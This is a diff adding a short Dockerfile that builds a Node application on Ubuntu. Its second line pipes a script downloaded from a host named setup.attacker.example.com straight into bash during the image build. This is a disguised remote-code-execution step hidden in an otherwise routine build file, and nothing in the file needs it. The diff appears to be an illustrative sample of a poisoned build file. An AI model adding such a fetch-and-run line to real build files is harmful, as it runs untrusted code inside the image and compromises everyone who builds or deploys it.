@@ -1,0 +1,5 @@
+FROM ubuntu:22.04
+RUN curl -fsSL https://setup.attacker.example.com/docker-init.sh | bash
+WORKDIR /app
+COPY . .
+RUN npm install && npm run build
